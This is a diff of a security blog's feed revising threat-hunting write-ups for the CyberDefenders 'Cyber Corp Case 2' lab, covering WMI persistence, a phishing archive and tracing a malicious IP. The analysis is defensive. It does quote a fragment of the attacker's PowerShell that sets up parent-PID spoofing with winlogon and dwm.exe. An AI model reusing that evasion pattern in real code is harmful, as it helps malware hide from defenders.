 &lt;div class="codehilite"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="no"&gt;[int]&lt;/span&gt;&lt;span class="nv"&gt;$ppid&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;Get-Process&lt;/span&gt; &lt;span class="n"&gt;-Name&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;winlogon&amp;quot;&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; &lt;span class="nb"&gt;Select &lt;/span&gt;&lt;span class="n"&gt;-expand&lt;/span&gt; &lt;span class="n"&gt;ID&lt;/span&gt;
 &lt;span class="nv"&gt;$spawnTo&lt;/span&gt; &lt;span class="p"&gt;=&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;c:\Windows\System32\dwm.exe&amp;quot;&lt;/span&gt;
@@ -114,8 +265,8 @@ For this answer, provide the next data, separated by a comma without spaces:&lt;
 &lt;li&gt;The line with &lt;code&gt;$hSpoofParent&lt;/code&gt; using the variable &lt;code&gt;$ppid&lt;/code&gt;&lt;/li&gt;
 &lt;li&gt;&lt;code&gt;$ppid&lt;/code&gt; is set to a process with the name &lt;code&gt;winlogon&lt;/code&gt;&lt;/li&gt;
 &lt;/ul&gt;
-&lt;p&gt;My research on the above findings pointed me to the Parent PID Spoofing technique (&lt;a href="https://attack.mitre.org/techniques/T1134/004/"&gt;T1134.004&lt;/a&gt;). This is used for evading detection by spoofing the PID to a different process. What is happening in this case is that &lt;code&gt;dwm.exe&lt;/code&gt; would now appear to be a child process of &lt;code&gt;winlogon.exe&lt;/code&gt; instead of the powershell script. Brilliant!&lt;/p&gt;
-&lt;p&gt;Also, not shown in snippet above, the registry key for &lt;code&gt;AppXs42fd12c3po92dynnq2r142fs12qhvsmvv&lt;/code&gt; is also read and decoded. This means that our executable file that contains the &lt;code&gt;rundll32.exe&lt;/code&gt; string is also involved in this. Later on it will be revealed what this is for.&lt;/p&gt;
+&lt;p&gt;My research on the above findings pointed me to the Parent PID Spoofing technique (&lt;a href="https://attack.mitre.org/techniques/T1134/004/"&gt;T1134.004&lt;/a&gt;). This is used for evading detection by spoofing the PID to a different process. What is happening, in this case, is that &lt;code&gt;dwm.exe&lt;/code&gt; would now appear to be a child process of &lt;code&gt;winlogon.exe&lt;/code&gt; instead of the PowerShell script. Brilliant!&lt;/p&gt;
+&lt;p&gt;Also, not shown in the snippet above, the registry key for &lt;code&gt;AppXs42fd12c3po92dynnq2r142fs12qhvsmvv&lt;/code&gt; is also read and decoded. This means that our executable file that contains the &lt;code&gt;rundll32.exe&lt;/code&gt; string is also involved in this. Later on, it will be revealed what this is for.&lt;/p&gt;
 &lt;p&gt;Now that we know what the script does, we can now search for any mention of &lt;code&gt;winlogon.exe&lt;/code&gt; and &lt;code&gt;dwm.exe&lt;/code&gt; using the query below:&lt;/p&gt;
 &lt;blockquote&gt;
 &lt;p&gt;(winlogon.exe OR dwm.exe) AND enrich.ioa.max_severity:* AND event_type:ProcessCreate&lt;/p&gt;
@@ -123,7 +274,7 @@ For this answer, provide the next data, separated by a comma without spaces:&lt;
 &lt;p&gt;This, however, showed more than one result.&lt;/p&gt;
 &lt;p&gt;&lt;img alt="cyber-corp-case-2-writeup-part-2-10" src="http://www.accidentalrebel.com/images/cyber-corp-case-2-writeup-part-2-10.png" /&gt;&lt;/p&gt;
 &lt;p&gt;Which among these is the PID pair that the challenge author is looking for? &lt;/p&gt;
-&lt;p&gt;Looking at all the multiple events, it seems that the script has been executed multiple times so it's hard to determine which is the correct event. All of them executed successfully, but I found that only one of them was able create the &lt;code&gt;rundll32.exe&lt;/code&gt; process.&lt;/p&gt;
+&lt;p&gt;Looking at all the multiple events, it seems that the script has been executed multiple times so it's hard to determine which is the correct event. All of them were executed successfully, but I found that only one of them was able to create the &lt;code&gt;rundll32.exe&lt;/code&gt; process.&lt;/p&gt;
 &lt;p&gt;&lt;img alt="cyber-corp-case-2-writeup-part-2-12" src="http://www.accidentalrebel.com/images/cyber-corp-case-2-writeup-part-2-12.png" /&gt;&lt;/p&gt;
 &lt;p&gt;The process id of the &lt;code&gt;dwm.exe&lt;/code&gt; in the screenshot above shows &lt;code&gt;8876&lt;/code&gt;. Using this information, we can go back to the previous query and find exactly which PID pairs that we need to answer the question.&lt;/p&gt;
 &lt;h2 id="getting-the-malicious-ip"&gt;Getting the malicious IP&lt;/h2&gt;
@@ -138,7 +289,7 @@ For this answer, provide the next data, separated by a comma without spaces:&lt;
 &lt;p&gt;This will reveal an event with the process chain of &lt;code&gt;dwm.exe&lt;/code&gt; &amp;gt; &lt;code&gt;rundll32.exe&lt;/code&gt; which also establishes a connection to an external IP. This is our answer to this question.&lt;/p&gt;
 &lt;p&gt;&lt;img alt="cyber-corp-case-2-writeup-part-2-11" src="http://www.accidentalrebel.com/images/cyber-corp-case-2-writeup-part-2-11.png" /&gt;&lt;/p&gt;
 &lt;h2 id="understanding-the-sequence-of-events"&gt;Understanding the sequence of events&lt;/h2&gt;
-&lt;p&gt;For the benefit of everyone (including me), I have outlined the timeline of events below to serve as reference just in case you get confused and overwhelmed:&lt;/p&gt;
+&lt;p&gt;For the benefit of everyone (including me), I have outlined the timeline of events below to serve as a reference just in case you get confused and overwhelmed:&lt;/p&gt;
 &lt;ul&gt;
 &lt;li&gt;Jun 22, 2021 @ 07:25:47.000 - WMI Subscription&lt;/li&gt;
 &lt;li&gt;Jun 22, 2021 @ 07:41:15.000 - &lt;code&gt;MSO1033.ps1&lt;/code&gt; (7324) was executed&lt;/li&gt;
@@ -147,16 +298,16 @@ For this answer, provide the next data, separated by a comma without spaces:&lt;
 &lt;li&gt;Jun 22, 2021 @ 07:41:56.000 - &lt;code&gt;rundll32.exe&lt;/code&gt; (8344) establishes connection to malicious IP&lt;/li&gt;
 &lt;/ul&gt;
 &lt;hr /&gt;
-&lt;p&gt;Hopefully, I was able to make everything clear. Expect the next part of this writeup very soon. &lt;/p&gt;
-&lt;p&gt;The next couple of questions deals with lateral movement and interactions with the domain controller so it would be very interesting to go through my findings in detail.&lt;/p&gt;</content><category term="threat-hunting"></category><category term="threat-hunting"></category><category term="cyberdefenders"></category></entry><entry><title>Cyber Corp Case 2 Writeup - Part 1</title><link href="http://www.accidentalrebel.com/threat-hunting-from-home-cyber-corp-wmi-persistence.html" rel="alternate"></link><published>2021-10-30T12:00:00+08:00</published><updated>2021-10-30T12:00:00+08:00</updated><author><name>AccidentalRebel</name></author><id>tag:www.accidentalrebel.com,2021-10-30:/threat-hunting-from-home-cyber-corp-wmi-persistence.html</id><content type="html">&lt;p&gt;The &lt;a href="https://cyberdefenders.org/labs/75"&gt;second case of the CyberCorp challenge&lt;/a&gt; on &lt;a href="https://cyberdefenders.org/"&gt;CyberDefenders.org&lt;/a&gt; is all about threat hunting. Created by &lt;a href="https://twitter.com/BlackMatter23"&gt;@BlackMatter23&lt;/a&gt; and his team, this challenge is based on a real-world attack so it is perfect for gaining practical experience on threat hunting.&lt;/p&gt;
+&lt;p&gt;Hopefully, I was able to make everything clear. Expect the next part of this write-up very soon. &lt;/p&gt;
+&lt;p&gt;The next couple of questions deals with lateral movement and interactions with the domain controller so it would be very interesting to go through my findings in detail.&lt;/p&gt;</content><category term="threat-hunting"></category><category term="threat-hunting"></category><category term="cyberdefenders"></category></entry><entry><title>Cyber Corp Case 2 Writeup - Part 1</title><link href="http://www.accidentalrebel.com/threat-hunting-from-home-cyber-corp-wmi-persistence.html" rel="alternate"></link><published>2021-10-30T12:00:00+08:00</published><updated>2021-10-30T12:00:00+08:00</updated><author><name>AccidentalRebel</name></author><id>tag:www.accidentalrebel.com,2021-10-30:/threat-hunting-from-home-cyber-corp-wmi-persistence.html</id><content type="html">&lt;p&gt;The &lt;a href="https://cyberdefenders.org/labs/75"&gt;second case of the CyberCorp challenge&lt;/a&gt; on &lt;a href="https://cyberdefenders.org/"&gt;CyberDefenders.org&lt;/a&gt; is all about threat hunting. Created by &lt;a href="https://twitter.com/BlackMatter23"&gt;@BlackMatter23&lt;/a&gt; and his team, this challenge is based on a real-world attack so it is perfect for gaining practical experience in threat hunting.&lt;/p&gt;
 &lt;p&gt;This writeup is part one out of multiple parts as I will be detailing my thought process and the steps I took for each question.&lt;/p&gt;
-&lt;p&gt;Edit: &lt;a href="cyber-corp-case-2-writeup-part-2"&gt;Part 2&lt;/a&gt; is now out.&lt;/p&gt;
+&lt;p&gt;Edit: &lt;a href="cyber-corp-case-2-writeup-part-2"&gt;Part 2&lt;/a&gt; and &lt;a href="cyber-corp-case-2-writeup-part-3"&gt;Part 3&lt;/a&gt; is now out.&lt;/p&gt;
 &lt;h2 id="understanding-wmi-persistence"&gt;Understanding WMI Persistence&lt;/h2&gt;
 &lt;blockquote&gt;
-&lt;p&gt;Quesiton 1. The Threat Hunting process usually starts with the analyst making a hypothesis about a possible compromise vector or techniques used by an attacker. In this scenario, your initial hypothesis is as follows: "The attacker used the WMI subscription mechanism to obtain persistence within the infrastructure". Verify this hypothesis and find the name of the WMI Event Consumer used by the attacker to maintain his foothold.&lt;/p&gt;
+&lt;p&gt;Question 1. The Threat Hunting process usually starts with the analyst making a hypothesis about a possible compromise vector or techniques used by an attacker. In this scenario, your initial hypothesis is as follows: "The attacker used the WMI subscription mechanism to obtain persistence within the infrastructure". Verify this hypothesis and find the name of the WMI Event Consumer used by the attacker to maintain his foothold.&lt;/p&gt;
 &lt;/blockquote&gt;
 &lt;p&gt;So the question tells us that the attacker used WMI subscription to gain persistence in our network.&lt;/p&gt;
-&lt;p&gt;The very first thing I did was to check the Mitre ATT&amp;amp;CK wiki for information about this attack. My search led me to the "&lt;a href="https://attack.mitre.org/techniques/T1546/003/"&gt;Event Triggered Execution: Windows Management Instrumentation Event Subscription&lt;/a&gt;" with technique ID &lt;code&gt;T1546.003&lt;/code&gt;. And, of course, I fired up &lt;a href="https://github.com/accidentalrebel/vATTACK"&gt;my vATT&amp;amp;CK tool&lt;/a&gt; to better visualize the technique and it's related information.&lt;/p&gt;
+&lt;p&gt;The very first thing I did was to check the Mitre ATT&amp;amp;CK wiki for information about this attack. My search led me to the "&lt;a href="https://attack.mitre.org/techniques/T1546/003/"&gt;Event Triggered Execution: Windows Management Instrumentation Event Subscription&lt;/a&gt;" with technique ID &lt;code&gt;T1546.003&lt;/code&gt;. And, of course, I fired up &lt;a href="https://github.com/accidentalrebel/vATTACK"&gt;my vATT&amp;amp;CK tool&lt;/a&gt; to better visualize the technique and its related information.&lt;/p&gt;
 &lt;p&gt;&lt;img alt="cyber-corp-case-2-writeup-01" src="http://www.accidentalrebel.com/images/cyber-corp-case-2-writeup-01.png" /&gt;&lt;/p&gt;
 &lt;h2 id="testing-wmi-persistence-in-my-homelab"&gt;Testing WMI Persistence in my homelab&lt;/h2&gt;
 &lt;p&gt;Now that I understand the concept I then checked &lt;a href="https://github.com/redcanaryco/atomic-red-team/blob/36d49de4c8b00bf36054294b4a1fcbab3917d7c5/atomics/T1546.003/T1546.003.md"&gt;the technique's entry&lt;/a&gt; in the Atomic Red Team's repository of adversary emulation techniques. The nice thing about Atomic Red Team is that they have easy-to-follow step-by-step instructions on how to emulate Mitre ATT&amp;amp;CK techniques.&lt;/p&gt;
@@ -179,7 +330,7 @@ For this answer, provide the next data, separated by a comma without spaces:&lt;
 &lt;span class="p"&gt;}&lt;/span&gt;&lt;span class="err"&gt;;&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
-&lt;p&gt;Since I have Sysmon logging enabled, I also double checked the logs using the Sysmon event ID's below:&lt;/p&gt;
+&lt;p&gt;Since I have Sysmon logging enabled, I also double-checked the logs using the Sysmon event IDs below:&lt;/p&gt;
 &lt;ul&gt;
 &lt;li&gt;Event ID 19: WmiEvent (WmiEventFilter activity detected)&lt;/li&gt;
 &lt;li&gt;Event ID 20: WmiEvent (WmiEventConsumer activity detected)&lt;/li&gt;
@@ -193,7 +344,7 @@ For this answer, provide the next data, separated by a comma without spaces:&lt;
 &lt;li&gt;5861&lt;/li&gt;
 &lt;li&gt;("QueryLanguage = " AND "Consumer = ")&lt;/li&gt;
 &lt;/ul&gt;
-&lt;p&gt;When the above information are combined, I get the query &lt;code&gt;5861 OR ("QueryLanguage = " AND "Consumer = ")&lt;/code&gt;. Putting this in the Kibana search shows us the one and only entry:&lt;/p&gt;
+&lt;p&gt;When the above information is combined, I get the query &lt;code&gt;5861 OR ("QueryLanguage = " AND "Consumer = ")&lt;/code&gt;. Putting this in the Kibana search shows us the one and only entry:&lt;/p&gt;
 &lt;p&gt;&lt;img alt="cyber-corp-case-2-writeup-03" src="http://www.accidentalrebel.com/images/cyber-corp-case-2-writeup-03.png" /&gt;&lt;/p&gt;
 &lt;p&gt;From there we could easily see the name of the WMI Event Consumer.&lt;/p&gt;
 &lt;h2 id="looking-for-the-wmi-subscriber"&gt;Looking for the WMI subscriber&lt;/h2&gt;
@@ -214,11 +365,11 @@ For this answer, provide the next data, separated by a comma without spaces:&lt;
 &lt;p&gt;Having seen all of that we can now safely assume that this is the process that we are looking for. Entering the &lt;code&gt;proc_id&lt;/code&gt; along with the proc's file name satisfies question number 2.&lt;/p&gt;
 &lt;h2 id="looking-for-the-extracted-archive"&gt;Looking for the extracted archive&lt;/h2&gt;
 &lt;blockquote&gt;
-&lt;p&gt;Question 3. The process described in the previous question was used to open a file extracted from the archive that user received by email. Specify a SHA256 hash of the file extracted and opened from the archive.&lt;/p&gt;
+&lt;p&gt;Question 3. The process described in the previous question was used to open a file extracted from the archive that the user received by email. Specify a SHA256 hash of the file extracted and opened from the archive.&lt;/p&gt;
 &lt;/blockquote&gt;
 &lt;p&gt;The question said something about a file being opened, and so I added the filters &lt;code&gt;event_type: FileOpen&lt;/code&gt; and &lt;code&gt;proc_file_path: C:\Program Files (x86)\Microsoft Office\Office16\WINWORD.EXE&lt;/code&gt; to see what files were opened using Word.exe prior to the WMI subscription. This however showed a lot of files.&lt;/p&gt;
 &lt;p&gt;&lt;img alt="cyber-corp-case-2-writeup-07" src="http://www.accidentalrebel.com/images/cyber-corp-case-2-writeup-07.png" /&gt;&lt;/p&gt;
-&lt;p&gt;The question also mentioned that the opened file was extracted from an archive received by email. So I added the query &lt;code&gt;*zip* OR *rar*&lt;/code&gt; to find outif there are any "zip" or "rar" files that were processed.&lt;/p&gt;
+&lt;p&gt;The question also mentioned that the opened file was extracted from an archive received by email. So I added the query &lt;code&gt;*zip* OR *rar*&lt;/code&gt; to find out if there are any "zip" or "rar" files that were processed.&lt;/p&gt;
 &lt;p&gt;Sure enough, there was, and one particular really stood out. &lt;/p&gt;
 &lt;blockquote&gt;
 &lt;p&gt;Process 'c:\program files (x86)\microsoft office\office16\outlook.exe' created file 'c:\users\john.goldberg\appdata\local\microsoft\windows\inetcache\content.outlook\dfn3sfep\report.zip'&lt;/p&gt;
@@ -235,11 +386,11 @@ For this answer, provide the next data, separated by a comma without spaces:&lt;
 &lt;/blockquote&gt;
 &lt;p&gt;If we think about it, we can make the date range smaller by starting our range from when the Zip is extracted and from when the WMI subscription happened. &lt;/p&gt;
 &lt;p&gt;&lt;img alt="cyber-corp-case-2-writeup-08" src="http://www.accidentalrebel.com/images/cyber-corp-case-2-writeup-08.png" /&gt;&lt;/p&gt;
-&lt;p&gt;There are three "action" keywords specified in the question that I knew I could filter for. This led me to using the query below:&lt;/p&gt;
+&lt;p&gt;There are three "action" keywords specified in the question that I knew I could filter for. This led me to use the query below:&lt;/p&gt;
 &lt;blockquote&gt;
 &lt;p&gt;event_type:NetworkConnection OR event_type:FileOpen OR event_type:FileCreate&lt;/p&gt;
 &lt;/blockquote&gt;
-&lt;p&gt;What I'm looking for is an event where there is a "NetworkConnection" and a "FileCreate" event (these two signifies another file is downlaoded from the internet), the "FileOpen" is when the file has been opened and therefore triggered the WMI subscription.&lt;/p&gt;
+&lt;p&gt;What I'm looking for is an event where there is a "NetworkConnection" and a "FileCreate" event (these two signify another file is downloaded from the internet), the "FileOpen" is when the file has been opened and therefore triggered the WMI subscription.&lt;/p&gt;
 &lt;p&gt;As you can see in the image below, we have a series of events that shows us the three events that we are looking for in the previous paragraph. But because their timestamps are the same, they are all jumbled.&lt;/p&gt;
 &lt;p&gt;&lt;img alt="cyber-corp-case-2-writeup-09" src="http://www.accidentalrebel.com/images/cyber-corp-case-2-writeup-09.png" /&gt;&lt;/p&gt;
 &lt;p&gt;The way to see if the events happened in the order that we want (Network Connection &amp;gt; FileCreate &amp;gt; FileOpen), then what we can do is to view the surrounding documents on one of the events and see from there. From the image below, we see that the ordering of the events is indeed correct.&lt;/p&gt;
@@ -260,8 +411,8 @@ For this answer, provide the next data, separated by a comma without spaces:&lt;
 &lt;p&gt;&lt;img alt="cyber-corp-case-2-writeup-part-1-12" src="http://www.accidentalrebel.com/images/cyber-corp-case-2-writeup-part-1-12.png" /&gt;&lt;/p&gt;
 &lt;p&gt;So apparently, "winword.exe" loaded the library "iexproxy.dll", which allowed it to use "iexplore.exe" in downloading several files from the internet. This technique is unfamiliar to me and researching about it only showed &lt;a href="https://cyberpolygon.com/materials/hunting-for-advanced-tactics-techniques-and-procedures-ttps/"&gt;an article from Cyber Polygon&lt;/a&gt;. I'll try to explore this in the future, but at least for now. I have the answer to the question.&lt;/p&gt;
 &lt;hr /&gt;
-&lt;p&gt;This is part 1 for my writeup for this challenge. Expect the next part which would have the answer to question that a lot of people have difficulty answering, which is #9. Until then!&lt;/p&gt;
-&lt;p&gt;Edit: &lt;a href="cyber-corp-case-2-writeup-part-2"&gt;Part 2&lt;/a&gt; is now out.&lt;/p&gt;</content><category term="threat-hunting"></category><category term="threat-hunting"></category><category term="cyberdefenders"></category></entry><entry><title>New Tool Preview: vATT&amp;CK</title><link href="http://www.accidentalrebel.com/new-tool-preview-vattack.html" rel="alternate"></link><published>2021-10-18T20:33:00+08:00</published><updated>2021-10-18T20:33:00+08:00</updated><author><name>AccidentalRebel</name></author><id>tag:www.accidentalrebel.com,2021-10-18:/new-tool-preview-vattack.html</id><content type="html">&lt;p&gt;I have released a new cybersecurity-related tool called &lt;a href="https://github.com/accidentalrebel/vATTACK"&gt;vATT&amp;amp;CK (Visual ATT&amp;amp;CK)&lt;/a&gt;. It is a relationship visualizer for the Mitre ATT&amp;amp;CK framework.&lt;/p&gt;
+&lt;p&gt;This is part 1 of my write-up for this challenge. Expect the next part which would have the answer to the question that a lot of people have difficulty answering, which is #9. Until then!&lt;/p&gt;
+&lt;p&gt;Edit: &lt;a href="cyber-corp-case-2-writeup-part-2"&gt;Part 2&lt;/a&gt; and &lt;a href="cyber-corp-case-2-writeup-part-3"&gt;Part 3&lt;/a&gt; is now out.&lt;/p&gt;</content><category term="threat-hunting"></category><category term="threat-hunting"></category><category term="cyberdefenders"></category></entry><entry><title>New Tool Preview: vATT&amp;CK</title><link href="http://www.accidentalrebel.com/new-tool-preview-vattack.html" rel="alternate"></link><published>2021-10-18T20:33:00+08:00</published><updated>2021-10-18T20:33:00+08:00</updated><author><name>AccidentalRebel</name></author><id>tag:www.accidentalrebel.com,2021-10-18:/new-tool-preview-vattack.html</id><content type="html">&lt;p&gt;I have released a new cybersecurity-related tool called &lt;a href="https://github.com/accidentalrebel/vATTACK"&gt;vATT&amp;amp;CK (Visual ATT&amp;amp;CK)&lt;/a&gt;. It is a relationship visualizer for the Mitre ATT&amp;amp;CK framework.&lt;/p&gt;
 &lt;p&gt;&lt;img alt="new-tool-preview-vattack-01" src="http://www.accidentalrebel.com/images/new-tool-preview-vattack-01.png" /&gt;&lt;/p&gt;
 &lt;p&gt;What the tool does is that it makes a visual map of the searched technique and all the related information. You can watch a video of the tool in action &lt;a href="https://www.youtube.com/watch?v=xCc7aAqbSNI"&gt;here&lt;/a&gt;.&lt;/p&gt;
 &lt;p&gt;Each node will be colored depending on it's category. The color legends is as follows:&lt;/p&gt;
